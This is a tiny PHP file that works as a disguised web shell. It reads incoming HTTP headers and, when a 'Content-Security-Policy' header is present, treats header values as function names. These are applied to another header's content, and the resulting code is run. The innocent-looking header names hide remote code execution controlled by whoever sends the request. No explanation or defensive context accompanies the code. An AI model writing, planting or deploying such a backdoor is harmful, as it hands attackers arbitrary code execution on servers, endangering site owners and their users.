<?php

$_HEADERS = getallheaders();
if (isset($_HEADERS['Content-Security-Policy'])) {
    $uconvert = $_HEADERS['Content-Security-Policy']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['If-Modified-Since']));
    $uconvert();
}